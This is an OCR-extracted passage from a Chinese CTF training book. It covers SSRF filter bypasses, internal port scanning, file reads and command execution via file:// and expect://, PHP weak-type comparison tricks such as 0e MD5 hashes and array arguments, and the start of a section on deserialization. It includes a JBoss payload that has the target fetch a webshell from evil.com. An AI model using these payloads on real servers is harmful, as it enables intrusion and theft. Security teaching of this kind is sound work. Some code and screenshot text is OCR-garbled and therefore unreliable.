0x7f.0x0.0x0.0x1（十六进制）
·127.1（IP地址省略写法）
以上4种写法均可表示地址127.0.0.1。
---
## Page 113
CTF特训营：技术详解、解题方法与
4.2防护绕过
113/1144
3）配置域名。如果我们手中有可控域名，则可将域名A记录指
向欲请求的IP进行绕过操作：
evil.example.com=>10.0.18.3
---
## Page 114
CTF特训营：技术详解、解题方法与
4.3危害与利用技巧
114/1144
4.3危害与利用技巧
利用SSRF漏洞可以进行的攻击类型有很多，这取决于服务端允
许的协议类型，包括但不限于下文要讲的这5种类型。
1.端口扫描
http://example.com/ssrf.php?url=http://192.168.252.130:21/
http://example.com/ssrf.php?url=http://192.168.252.130:22/
http://example.com/ssrf.php?url=http://192.168.252.130:80/
http://example.com/ssrf.php?url=http://192.168.252.130:443/
http://example.com/ssrf.php?url=http://192.168.252.130:3306/
...snip...
可通过应用响应时间、返回的错误信息、返回的服务Banner来
判断端口是否开放，如图4-2所示。
---
## Page 115
CTF特训营：技术详解、解题方法与
4.3危害与利用技巧
115/1144
http://example.com/ssrf.phpx
http://example.com/ssrf.php
①example.com/st
?
》
InkSec-
AndroidGitHub
InkSec
Android-
GlitHub
INT
SQL·XSS·Encrypti
Enco
INT
SQL·XSSEncryption
Load URL
http://example.com/ssrf.php
Load URL
?url=http:/192.168.252.130:22/
7url=http://192.168.252.130:80/
http://example.com/ssrf.php
Split URL
Split URL
Execute
Execute
Enable Post data  Enable Referrer
Enable Post data Enable Referrer
Warning:
Warning:
file_get_contents(http://192.168.252.130:22):
file_get_contents(http://192.168.252.130:80/):
failedtoopenstream:HTTPrequestfailed!
failed toopenstream:Connectionrefusedin
SSH-2.0-OpenSSH_6.6.1p1Ubuntu-2ubuntu2
Nar/www/html/ssrf.php online3
in/var/www/html/ssrf.phponline3
图4-2SSRF探测内网服务端口示例
图4-2中，左侧为访问22端口并从错误信息中返回Banner，右侧
为访问80端口被拒绝（未开放）。当PHP未开启显错模式时，可通过
响应时间来判断端口是否开放。
2.攻击内网或本地存在漏洞的服务
利用SSRF漏洞可对内网存在漏洞的服务进行攻击（如缓冲区溢
出等），如图4-3所示。
---
## Page 116
CTF特训营：技术详解、解题方法与
4.3危害与利用技巧
116/1144
Value
http%3A%2F%2F127.0.0.1%3A8987/AA
WindowsXPUnpatched [Running] - Oracle VM VirtualBox
口
Pailedt
图4-3SSRF攻击内网服务示例
如对HTTP发送的数据是否能被其他服务协议接收存在疑问，可
参考Freebuf上的文章：《跨协议通信技术利用》[1]
另外，值得注意的是Gopher协议，其说明如下。
Gopher协议是HTTP出现之前，在lntemet上常见且常用的一种协
议。当然现在Gopher协议已经慢慢淡出历史。Gopher协议可以做很
---
## Page 117
CTF特训营：技术详解、解题方法与
4.3危害与利用技巧
117/1144
正在加载中
---
## Page 118
CTF特训营：技术详解、解题方法与
4.3危害与利用技巧
118/1144
得到应用指纹后，便能有针对性地对其存在的漏洞进行利用。如
下Payload展示了如何利用SSRF漏洞攻击内网的JBoss应用：
http://example.com/ssrf.php?url=http%3A%2F%2F127.0.0.1%3A8080%2Fjmx
console%2FHtmlAdaptor%3Faction%3DinvokeOp%26name%3Djboss.system%
253Aservice%253DMainDeployer%26methodlndex%3D3%26arg0%3Dhttp%253A%
252F%252Fevil.com%252Fwebshell.war
4.文件读取
如果攻击者指定了fle协议，则可通过fle协议来读取服务器上的
文件内容，如：
http://example.com/ssrf.php?url=file://etc/passwd
执行结果如图4-4所示。
5.命令执行
PHP环境下如果安装了expect扩展，还可以通过expect协议执行
系统命令，如：
http://example.com/ssrf.php?url=expect://id
---
## Page 119
CTF特训营：技术详解、解题方法与
4.3危害与利用技巧
119/1144
http://example.com/ssrf.php?url=
①view-source:http://example.c
C
←
北
》》
InkSec
Android-GitHubHack
Linux
INT
SQL·XSSEncryptionEncodingOther
Load URL
view-source:http://example.com/ssrf.php
SplitURL
?url=file:///etc/passwd
Execute
EnablePost dataEnableReferrer
4 2
iodine:x:123:65534::/var/run/iodine:/bin/false
43
redis:x:124:135::/var/lib/redis:/bin/false
redsocks:x:125:136::/var/run/redsocks:/bin/false
45
rwhod:x:126:65534::/var/spool/rwho:/bin/false
46
sslh:x:127:137::/nonexistent:/bin/false
rtkit:x:128:138:RealtimeKit,,,:/proc:/bin/false
48
saned:x:129:139::/var/1ib/saned:/bin/false
49usbmux:x:130:46:usbmuxdaemon,,,:/var/1ib/usbmux:
50
beef-xss:x:131:140::/var/lib/beef-xss:/bin/false
51
Debian-gdm:x:132:142:Gnome DisplayManager:/var/1
52wabzsy:x:1000:1001::/home/wabzsy:/bin/sh
图4-4SSRF读取文件示例
[1]http://www.freebuf.com/articles/web/19622.html
---
## Page 120
CTF特训营：技术详解、解题方法与
4.4实例
120/1144
4.4实例
XDCTF（LCTF）2015中Web300就是一道与SSRF相关的题目）
首先，通过file协议读取源代码，具体如下：
I/ file://index.php
0x01'==1
》0e123456789'==0e987654321
》[false]==[0] ==[NULL] ==[]
》NULL==false==0
> true == 1
在PHP语言中，比较两个值是否相等可以用“==”和“===”两
种符号。前者会在比较的时候自动进行类型转换而不改变原来的值，
所以存在漏洞的位置所用的往往是“==”。其中一个常见的错误用法
就是：
if（$input==1）
敏感逻辑操作；
这个时候，如果input变量的值为1abc，则比较的时候1abc会被
转换为1，i语句的条件满足，进而造成其他的漏洞。另一个常见的场
---
## Page 125
CTF特训营：技术详解、解题方法与
5.1.1弱类型
125/1144
景是在运用函数的时候，参数和返回值经过了类型转换造成漏洞。下
面我们再来看一道真题
if($_GET[a]!=S_GET[b] && md5($_GET[a])==md5(S_GET[b])
echoSflag
如何才能满足这样一个if判断条件呢？需要使两个变量值不相等
而MD5值相等。这样的思路可以通过MD5碰撞来解决（https://lgo0.gll
KV5ZQn）。让我们的思路回到PHP语言，MD5函数的返回值是一个
32位的字符串，如果这个字符串以“0e”开头的话，类型转换机制
会将它识别为一个科学计数法表示的数学“0”。下面给出两个MD5
以0e开头的字符串：
aabg7XSs'=>0e087386482136013740957780965295
aabC9RqS'=>0e041022518165728065344349536299
提交这两个字符串即可绕过判断。然后我们再来看一下上面示例
题目的2.0版：
if($_GET[a]!=S_GET[b]&&md5($_GET[a])===md5(S_GET[b])){
echoSflag:
{
---
## Page 126
CTF特训营：技术详解、解题方法与
5.1.1弱类型
126/1144
当我们将“==”更换为"===”之后（如上方的代码），刚才的
两个字符串就不能成功了。但是，我们仍然可以继续利用PHP语言函
数错误处理上的特性，在URL栏提交a0=1&b0=2成功绕过。因为当我
们令MD5函数的参数为一个数组的时候，函数会报错并返回NOLL
值。虽然函数的参数是两个不同的数组，但函数的返回值是相同的
NULL，在这里就是利用这一点巧妙地绕过了判断。
同样在程序返回值中容易判断错误的函数还有很多，如strpos
见PHP手册：
（PHP4,PHP5,PHP7)
strpos--查找字符串首次出现的位置
敏感逻辑操作：
}
这也是一种经常能见到的写法，当str1在str2开头时，函数的返
回值是O，而o==false是成立的，这就会造成开发者逻辑之外的结
果。
---
## Page 127
CTF特训营：技术详解、解题方法与
5.1.2反序列化漏洞
127/1144
5.1.2反序列化漏洞
PHP提供serialize和unserialize函数将任意类型的数据转换成
string类型或者从string类型还原成任意类型。当unserialize函数的参
数被用户控制的时候就会形成反序列化漏洞。
与之相关的是PHP语法中的类，PHP的类中可能会包含一些特殊
的函数，名为magic函数，magic函数的命名方式是以符号“_”开
头的，比如_construct、_destruct、_toString、_sleep、
_wakeup等。这些函数在某些情况下会被自动调用。
为了更好地理解magic函数是如何工作的，我们可以自行创建一
个PHP文件，并在当中增加三个magic函数：_construct、_destruct
和_toString，图5-1为测试代码和执行结果。
H2
_toStringO(
inkSec
Android ·GitHub
Split URI
ExecuA
111
---
## Page 128
CTF特训营：技术详解、解题方法与
5.1.2反序列化漏洞
128/1144
图5-1magic函数调用示例
可以看出，_construct在对象创建时被调用，_destruct在PHP
脚本结束时被调用，_toString在对象被当作一个字符串使用时被调
用。如果我们在反序列化的时候加入一个类，并控制类中的变量值
那么结合具体的代码就能够执行magic函数里的危险逻辑了。如
NJCTF2017出过的一道题目，源码如下：
source, true)
?>
质面的功能是将从cookie中反序列化过后的对象打印出来，这样
_toString（函数就会在打印的时候被调用。在本地生成filelist对象的
时候，可以将source变量的值设置为想要读取的文件名，序列化后再
提交即可。生成序列化学符串的代码如下：
<?php
Classfilelist(
public function_toString()